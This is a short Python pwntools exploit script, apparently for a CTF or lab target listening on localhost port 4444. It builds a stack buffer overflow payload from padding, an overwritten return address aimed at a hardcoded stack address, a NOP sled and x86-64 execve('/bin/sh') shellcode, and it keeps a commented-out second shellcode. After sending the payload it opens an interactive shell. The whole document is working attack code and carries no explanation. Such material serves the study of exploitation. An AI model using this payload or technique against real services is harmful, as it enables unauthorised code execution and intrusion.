from pwn import *

r = remote("127.0.0.1", 4444)

buf = b"A"*7 + b"\r"
buf += b"A" * (544 - len(buf))
buf += b"BBBBCCCC"
buf += p64(0x7fffffffec98)

buf += b"\x90" * 200
buf += b"jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7hri\x01\x01\x814\x24\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"

#shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#buf += shellcode

print(r.recvline().decode())
r.send(buf)
r.interactive()
